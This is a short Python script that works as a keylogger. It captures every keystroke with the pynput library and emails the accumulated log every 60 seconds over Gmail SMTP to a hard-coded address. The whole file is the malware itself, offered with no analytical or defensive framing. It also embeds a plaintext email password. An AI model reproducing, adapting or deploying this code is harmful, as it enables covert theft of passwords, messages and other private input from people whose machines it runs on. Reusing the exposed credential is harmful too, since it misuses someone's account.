from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

EMAIL_ORIGIN = "testesmtpcompleto@gmail.com"
EMAIL_DESTINATION = "testesmtpcompleto@gmail.com"
EMAIL_PASSWORD = "vujw sbim qxyn exzy"

log = ""

def send_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Keylogger Report'
        msg['From'] = EMAIL_ORIGIN
        msg['To'] = EMAIL_DESTINATION 

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGIN, EMAIL_PASSWORD)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {e}")
        log = ""
    Timer(60, send_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += ' '
        else:
            log += f' [{key.name}] '

send_email()
with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
